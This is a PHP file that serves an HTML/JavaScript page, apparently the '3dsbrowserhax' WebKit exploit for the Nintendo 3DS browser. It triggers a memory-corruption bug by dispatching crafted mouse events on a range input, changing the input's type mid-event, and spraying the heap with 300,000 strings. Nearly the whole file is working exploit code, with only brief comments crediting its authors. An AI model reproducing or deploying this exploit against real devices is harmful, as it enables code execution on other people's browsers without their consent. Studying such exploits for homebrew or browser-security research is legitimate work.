<?php

$con = "<html>
<head>
<script>
//http://trac.webkit.org/changeset/158724
//Different version of 3dsbrowserhax_webkit_r158724.php which also works with new3ds. Most of the below html/js is by kemurphy, the heap spray stuff / etc is by yellows8.
//It seems the alert(\"test2\") call is needed, otherwise the vuln doesn't (always?) trigger.

var s = new String(unescape(\"12341234\"));
var pwt = null;

obj = new Array();

function down(x) {
//alert(\"down\");
    var evt = document.createEvent('MouseEvents');
    evt.initMouseEvent('mousedown',true,true,document.defaultView,0,x,0,x,0,false,false,false,0,null,null);
    pwt.dispatchEvent(evt);
}

function up(x) {
//alert(\"up\");
    var evt = document.createEvent('MouseEvents');
    evt.initMouseEvent('mouseup',true,true,document.defaultView,0,x,0,x,0,false,false,false,0,null,null);
    pwt.dispatchEvent(evt);
}

function strap() {
//alert(\"strap\");
    pwt = document.getElementById('pwt');
    down(0);
}

function two() {
    up(20);
    pwt.onmousedown = null;

   //alert(\"two\");
}

function one() {
    up(0);
    pwt.onmousedown = two;

    //alert(\"one\");

    pwt.onchange = null;
    down(20);

//alert(\"test\");

    pwt.type = 'hax';
alert(\"test2\");
    //for (var i = 0; i < 300000; i++) { s += new String(unescape(\"\u4141\u4141\")); }

//var objectdata = unescape(\"\u4141\u4141\u4141\u4141\");

for(i=0; i<300000; i++)
{
	//longobjstr+= objectdata;
	obj[i] = unescape(\"\u4141\u4141\u4141\u4141\");
}

    var hax = document.createEvent('CustomEvent');
//alert(\"test3\");
    hax.initCustomEvent('trololo',true,false,{});
    //alert(\"three\");

    document.dispatchEvent(hax);
    up(20);
}

</script>
</head>
<body>
<input id=\"pwt\" onchange=\"one();\" type=\"range\" id=\"input\"/>
<button onclick=\"strap();\">go</button>
</body>
</html>";

echo $con;

?>
